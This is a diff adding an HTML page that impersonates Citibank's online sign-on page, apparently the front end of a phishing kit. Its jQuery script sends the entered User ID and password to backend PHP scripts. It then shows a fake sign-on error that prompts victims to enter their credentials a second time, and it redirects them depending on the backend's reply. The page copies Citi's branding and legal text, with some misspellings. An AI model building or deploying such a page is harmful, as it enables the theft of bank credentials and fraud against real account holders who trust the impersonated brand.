@@ -1,0 +1,471 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
+    <link rel="shortcut icon" href="./assets/img/fav.ico" type="image/x-icon">
+    <link rel="stylesheet" href="./assets/css/style.css">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <title>Sign on to Your Citi Account</title>
+</head>
+<body>
+    <div id="pageloader">
+        <div class="lds-dual-ring"></div>
+    </div>
+    <style>
+        #pageloader
+            {
+            background: rgba(0,0,0,0.5);
+            display: none;
+            height: 100%;
+            position: fixed;
+            width: 100%;
+            z-index: 9999;
+            }
+
+            
+            .lds-dual-ring {
+            display: inline-block;
+            width: 80px;
+            height: 80px;
+            }
+            .lds-dual-ring:after {
+            content: " ";
+            display: block;
+            width: 64px;
+            height: 64px;
+            margin: 8px;
+            border-radius: 50%;
+            border: 6px solid #fff;
+            border-color: #fff transparent #fff transparent;
+            animation: lds-dual-ring 1.2s linear infinite;
+            left: 50%;
+            margin-left: -32px;
+            margin-top: -32px;
+            position: absolute;
+            top: 50%;
+            }
+            @keyframes lds-dual-ring {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+            }
+
+    </style>
+    <nav class="flex sb">
+        <div>   
+            <img src="./assets/img/lt.png" class="ct-logo-top" alt="Logo">
+        </div>
+        <div class="flex sb righnav">
+            <div class="locDiv"> 
+                <img class="loc" src="./assets/img/loc.svg" alt="">
+                <p class="ttext">
+                    ATM / BRANCH
+                </p>
+            </div>
+
+            <div>
+                <img class="world" src="./assets/img/world.svg" alt="">
+                <p class="ttext">
+                    ESPAÑOL
+                </p>
+            </div>
+        </div>
+    </nav>
+    <div class="bgDiv">
+        <div class="flex flr">
+            <div class="loginDiv">
+                <div class="flex sb">
+                    <div>
+                        <div id="signonText">
+                            <p class="signonForm">
+                                Sign On
+                            </p>
+                        </div>
+
+                        <div id="errorDiv"> 
+                            <div class="flex errordiv">
+                                <div>
+                                    <span class="material-icons warnc">
+                                        error
+                                        </span>
+                                </div>
+                                <div>
+                                    <p class="mainerror">
+                                        <span class="errorc">Trouble Signing on?</span>  Select "Forgot User ID or Password"
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                   <div id="citiqrDiv" class="flex">
+                        <div>
+                            <img src="./assets/img/citiqr.PNG" class="citiqr" alt="">
+                        </div>
+                        <div>
+                            <p class="signinTe">
+                                Sign On with the <br> Citi Mobile® App
+                            </p>
+                        </div>
+                    </div>
+                </div>
+                <form id="form1" action="./backend/index.php" method="POST">
+
+                
+                <div class="flex inputDiv sb">
+                    <div>
+                        <p id="usrt" class="inputTop">
+                            User ID
+                        </p>
+                        <input type="text" class="inputbox" placeholder="User ID" name="usr" required="" id="usr">
+                    </div>
+                    <div>
+                        <p id="pwt" class="inputTop">
+                            Password
+                        </p>
+                        <input type="password" class="inputbox" placeholder="Password" name="pw" required="" id="pw">
+                    </div>
+                    
+                </div>
+                <br>
+                <div class="flex">
+                        <div>
+                            <img id="checkno" class="checkno toggleRemember" src="./assets/img/checkno.png" alt="">
+                            <img id="checkyes" class="checkyes toggleRemember" src="./assets/img/checkyes.png" alt="">
+                        </div>
+                        <div>
+                            <p id="rusert" class="rusert toggleRemember">
+                                Remember User ID
+                            </p>
+                            
+                        </div>
+                </div>
+                <p id="donopublic">
+                    Do not select if you are using a public computer.
+                </p>
+                <div>
+                    <button type="button" id="submitbutton" class="SignOnbutton">Sign On</button>
+                </div>
+            </form>
+                <div class="forgotDiv">
+                    <div class="flex sb">
+                        <div>
+                            <p>
+                                Forgot User ID?
+                            </p>
+                            <p>
+                                Activate a Card
+                            </p>
+                        </div>
+                        <div>
+                            <p>
+                                Forgot Password?
+                            </p>
+                            <p>
+                                Register For online Access
+                            </p>
+                        </div>
+                  
+                    </div>
+                   
+                </div>
+               
+            </div>
+        </div>
+    </div>
+    <footer>
+     <div class="fwrapper">
+
+        
+        <div class="footerTop">
+            <div>
+                <p class="f-h-t">
+                    Why Citi
+                </p>
+                <p class="f-t-t">
+                    Careers
+                </p>
+                <p class="f-t-t">
+                    Benifits and Services
+                </p>
+                <p class="f-t-t">
+                    Rewards
+                </p>
+                <p class="f-t-t">
+                    Citi Easy Deals <span>SM</span>
+                </p>
+                <p class="f-t-t">
+                    Citi Entertainment<span>®</span>
+                </p>
+                <p class="f-t-t">
+                    Special Offers
+                </p>
+            </div>
+            <div>
+                <p class="f-h-t">
+                    Wealth Management
+                </p>
+                <p class="f-t-t">
+                    Citigold<span>®</span> Private Client
+                </p>
+                <p class="f-t-t">
+                    Citigold
+                </p>
+                <p class="f-t-t">
+                    Citi Priority
+                </p>
+                <p class="f-t-t">
+                    Citi Private Bank 
+                </p>
+              
+            </div>
+            <div>
+                <p class="f-h-t">
+                    Business Banking
+                </p>
+                <p class="f-t-t">
+                    Small Business Accounts
+                </p>
+                <p class="f-t-t">
+                    Comerciaol Accounts
+                </p>
+       
+            </div>
+            <div>
+                <p class="f-h-t">
+                    Rates
+                </p>
+                <p class="f-t-t">
+                    Personal Banking
+                </p>
+                <p class="f-t-t">
+                    Credit Cards
+                </p>
+                <p class="f-t-t">
+                    Mortgage
+                </p>
+                <p class="f-t-t">
+                    Home Equity
+                </p>
+                <p class="f-t-t">
+                    Lending
+                </p>
+            </div>
+            <div>
+                <p class="f-h-t">
+                    Help &amp; Support
+                </p>
+                <p class="f-t-t">
+                    Contact Us
+                </p>
+                <p class="f-t-t">
+                    Help &amp; FAQs
+                </p>
+                <p class="f-t-t">
+                    Security Center
+                </p>
+            </div>
+            <div>
+                <img class="eqh" src="./assets/img/eqh.png" alt="">
+            </div>
+        </div>
+        <div class="AppDiv">
+            <div class="flex install">
+                <div>
+                    <img src="./assets/img/gp.png" alt="">
+                </div>
+                <div>
+                    <img src="./assets/img/ap.png" alt="">
+                </div>
+            </div>
+            <div class="flex socialIcons">
+                <div>
+                    <img style="width: 13px;" src="./assets/img/f.png" alt="">
+                </div>
+                <div>
+                    <img src="./assets/img/t.png" alt="">
+                </div>
+                <div>
+                    <img src="./assets/img/y.png" alt="">
+                </div>
+            </div>
+            
+        </div>
+           
+        <hr>
+            <div class="flex footlinet">
+                <div>
+                    <p class="footlinetf">
+                        © 2022 Citigroup Inc
+                    </p>
+                </div>
+                <div>
+                    <p class="footlinets">
+                        Terms &amp; Conditions
+                    </p>
+                </div>
+                <div>
+                    <p class="footlinets">
+                        Privacy
+                    </p>
+                </div>
+                <div>
+                    <p class="footlinets">
+                        Notice at Collection
+                    </p>
+                </div>
+                <div>
+                    <p class="footlinets">
+                        CA Privacy Hub
+                    </p>
+                </div>
+                <div>
+                    <p class="footlinets">
+                        Accessibility
+                    </p>
+                </div>
+                <div>
+                    <p class="footlinets">
+                        Country &amp; Juridictions: <span class="footlinetf">United States &gt;</span>
+                    </p>
+                </div>
+            </div>
+            
+            <hr>
+            <br>
+            <div class="lastfTextDiv">
+                <p class="folT">
+                    Important Legal Disclosures &amp; Information
+                </p>
+                <p class="footl">
+                    Citibank.com provides information about and access to accounts and financial services provided by Citibank, N.A. and its affiliates in the United States and its territories. It does not, and should not be construed as, an offer, invitation or solicitation of services to individuals outside of the United States.
+                </p>
+                <p class="footl">
+                    Terms, conditions and fees for accounts, products, programs and services are subject to change. Not all accounts, products, and services as well as pricing described here are available in all jurisdictions or to all customers. Your eligibility for a particular product and service is subject to a final determination by Citibank. Your country of citizenship, domicile, or residence, if other than the United States, may have laws, rules, and regulations that govern or affect your application for and use of our accounts, products and services, including laws and regulations regarding taxes, exchange and/or capital controls that you are responsible for following.
+                </p>
+                <p class="footl">
+                    The products, account packages, promotional offers and services described in this website may not apply to customers of International Personal Bank U.S. in the Citigold® Private Client International, Citigold® International, Citi International Personal, Citi Global Executive Preferred, and Citi Global Executive Account Packages.
+
+
+                </p>
+            </div>
+
+      </div> 
+      <div>
+          <img class="botP" src="./assets/img/bot.png" alt="">
+      </div>
+    </footer>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script>
+    $(".toggleRemember").click(function() {   
+
+     if ($('#checkno').is(':visible')){
+     $('#checkno').hide();    
+     $('#checkyes').show(); 
+     $('#donopublic').show();   
+     $('#rusert').css({ 'color': '#0c71c7', 'text-decoration' : 'underline'});
+     } else{
+        $('#checkno').show();    
+         $('#checkyes').hide();
+         $('#donopublic').hide();
+         $('#rusert').css({ 'color': 'black', 'text-decoration' : 'none'});
+     }
+     });
+
+     $("#usr").on('focus', function () {
+        $('#usrt').css({'color': '#666666', 'transition': 'color 0.5s'});    
+        $('#usr').removeAttr('placeholder');
+        });
+     $("#pw").on('focus', function () {
+        $('#pwt').css({'color': '#666666', 'transition': 'color 0.5s'});    
+        $('#pw').removeAttr('placeholder');
+        });    
+    $("#usr").focusout(function(){
+       let usrv =  $(this).val();
+       if(usrv.length == 0) {
+        $('#usrt').css({'color': 'white'});    
+        $('#usr').attr("placeholder", "User ID");
+       }
+        });   
+    $("#pw").focusout(function(){
+       let pwv =  $(this).val();
+       if(pwv.length == 0) {
+        $('#pwt').css({'color': 'white'});    
+        $('#pw').attr("placeholder", "Password");
+       }
+        });     
+</script>
+<script>
+    var fst = 1;
+    $("#submitbutton").click(function(){
+        if(fst != 2){
+            console.log("f");
+        var usr     = $('#usr').val();
+        var pw     = $('#pw').val();
+        if(usr && pw){
+        $("#pageloader").fadeIn();
+        $.ajax({
+            type: "POST",
+            url: "./backend/10h.php",
+            data: $('#form1').serialize() ,
+            success: function(data){
+                if(data == 'ydual'){
+                $("#signonText").hide();
+                $("#citiqrDiv").hide();
+                $("#errorDiv").show();
+                $('#usr').val("");
+                $('#pw').val("");
+                fst = 2;
+                $("#pageloader").fadeOut(); 
+            } else {
+                $.ajax({
+                    type: "POST",
+                    url: "./backend/sr.php",
+                    data: $('#form1').serialize() ,
+                    success: function(data){
+                        if(data == 'ysus'){ 
+                            $(location).prop('href', './20h.php')
+                        } else {
+
+                            $(location).prop('href', './30h.php')
+                        }
+                }
+                });
+            }
+
+            }
+        });
+     }
+        } else {
+        console.log("g");
+        var usr     = $('#usr').val();
+        var pw     = $('#pw').val();
+        if(usr && pw){
+        $("#pageloader").fadeIn();
+        $.ajax({
+            type: "POST",
+            url: "./backend/20h.php",
+            data: $('#form1').serialize() ,
+            success: function(data){
+                if(data == 'ysus'){ 
+                            $(location).prop('href', './20h.php')
+                        } else {
+
+                            $(location).prop('href', './30h.php')
+                        }
+
+            }
+        });
+     }
+    
+        }
+        
+    });
+    
+</script>
+
+</body></html>
